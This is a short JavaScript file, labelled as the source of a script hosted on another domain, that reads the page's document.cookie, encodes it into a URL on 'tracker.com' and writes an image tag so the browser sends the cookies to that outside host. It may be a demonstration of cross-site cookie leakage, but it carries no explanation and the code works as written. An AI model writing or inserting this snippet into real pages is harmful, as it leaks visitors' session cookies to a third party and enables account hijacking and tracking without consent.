// source of http://another.com/a.js


x = document.cookie;
var url = 'http://tracker.com/track?tid=' + encodeURI(document.cookie);    
console.log(url);
document.write('<img src=' + url + '/>');
